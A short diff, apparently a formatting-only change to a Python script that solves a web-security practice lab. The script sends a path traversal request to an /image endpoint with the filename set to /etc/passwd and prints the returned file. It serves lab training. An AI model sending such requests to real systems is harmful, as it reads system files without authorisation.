@@ -6,9 +6,11 @@ import requests
 
 def solve_lab(url, proxies):
     url = urljoin(url, "/image")
-    params = { "filename": "/etc/passwd" }
+    params = {"filename": "/etc/passwd"}
 
-    print_info(f"Exploiting path traversal vulnerability by visiting \"{url}?{urlencode(params)}\"...")
+    print_info(
+        f'Exploiting path traversal vulnerability by visiting "{url}?{urlencode(params)}"...'
+    )
     resp = requests.get(url, proxies=proxies, verify=False, params=params)
 
     if resp.status_code != 200:
@@ -16,4 +18,3 @@ def solve_lab(url, proxies):
     else:
         print_success("GET request came back with the following response:")
         print(resp.text)
-
